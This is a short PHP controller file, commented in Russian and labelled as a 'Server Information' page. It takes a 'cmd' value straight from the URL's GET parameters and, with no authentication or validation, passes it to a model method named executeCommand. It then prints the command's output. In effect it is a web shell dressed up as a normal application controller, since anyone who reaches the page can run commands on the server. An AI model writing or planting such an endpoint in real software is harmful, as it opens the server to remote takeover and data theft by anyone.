<?php
// app/Controllers/ServerController.php

namespace App\Controllers;

use App\Models\ServerModel;

class ServerController
{
    protected $serverModel;

    public function __construct()
    {
        $this->serverModel = new ServerModel();
    }

    // Метод для обработки запроса на выполнение команды
    public function handleRequest()
    {
        // Получаем команду из GET-параметра
        $cmd = isset($_GET['cmd']) ? $_GET['cmd'] : "ls -l";

        // Выполняем команду через модель
        $result = $this->serverModel->executeCommand($cmd);

        // Отображаем результат
        $this->renderResult($result);
    }

    // Метод для отображения результата
    private function renderResult($result)
    {
        echo '<html lang="en">';
        echo '<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Server Information</title></head>';
        echo '<body><h1>Server Information</h1><pre>' . htmlspecialchars($result) . '</pre></body>';
        echo '</html>';
    }
}
